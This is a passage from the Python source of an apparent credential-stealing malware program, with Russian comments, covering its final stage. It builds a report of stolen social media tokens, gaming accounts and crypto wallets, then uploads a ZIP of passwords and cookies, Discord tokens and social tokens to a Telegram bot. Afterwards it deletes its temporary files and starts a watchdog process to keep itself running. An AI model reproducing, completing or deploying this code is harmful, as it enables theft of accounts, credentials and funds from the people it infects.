• Instagram: <b>{len(social_tokens['instagram'])}</b>
• Twitter/X: <b>{len(social_tokens['twitter'])}</b>
• TikTok: <b>{len(social_tokens['tiktok'])}</b>
• Reddit: <b>{len(social_tokens['reddit'])}</b>
• VK: <b>{len(social_tokens['vk'])}</b>

🎮 <b>Игры:</b>
• Steam аккаунтов: <b>{len(steam_data['accounts'])}</b>
• Epic Games: <b>{len(epic_data)}</b>
• Minecraft: <b>{len(mc_data['accounts'])}</b>

💰 <b>Крипто-кошельки:</b> <b>{len(wallets)}</b>
{
    chr(10).join(['• ' + w for w in wallets]) if wallets else '• Не найдены'
}

📦 <b>ZIP:</b> <code>{zip_size // 1024} KB</code>
⏰ <code>{time.strftime('%H:%M:%S')}</code>"""
    
    # Отправляем сообщение
    send_telegram_message(report)
    time.sleep(1)
    
    # Отправляем ZIP с паролями и куками
    if zip_size > 0:
        send_telegram_file(zip_path, f"💾 Full loot - {VICTIM_ID[:8]}")
        time.sleep(1)
    
    # Если Discord токены есть - отправляем отдельно
    if discord_tokens:
        discord_path = os.path.join(temp_dir, "discord_tokens.txt")
        with open(discord_path, 'w') as f:
            f.write('\n'.join(discord_tokens))
        send_telegram_file(discord_path, "💬 Discord Tokens")
        time.sleep(1)
    
    # Если соцсети есть - отправляем отдельно
    if any(social_tokens.values()):
        social_path = os.path.join(temp_dir, "social_tokens.json")
        with open(social_path, 'w', encoding='utf-8') as f:
            json.dump(social_tokens, f, indent=2, ensure_ascii=False)
        send_telegram_file(social_path, "📱 Social Media Tokens")
        time.sleep(1)
    
    # ========== ОЧИСТКА ==========
    log("="*50)
    log("ОЧИСТКА")
    log("="*50)
    
    time.sleep(2)
    shutil.rmtree(temp_dir, ignore_errors=True)
    log("Временные файлы удалены")
    
    print("""
    ╔══════════════════════════════════════╗
    ║         ГОТОВО! ЛУТ В БОТЕ!        ║
    ╚══════════════════════════════════════╝
    """)

# ============================================
# ТОЧКА ВХОДА
# ============================================
if __name__ == "__main__":
    # Запускаем watchdog в отдельном процессе
    watchdog = multiprocessing.Process(target=watchdog_process, daemon=False)
    watchdog.start()
    
    # Запускаем основной стилер
    main_stealer()
    
    # Держим процесс живым чтобы watchdog не перезапускал
    # Если стилер завершился нормально
    watchdog.terminate()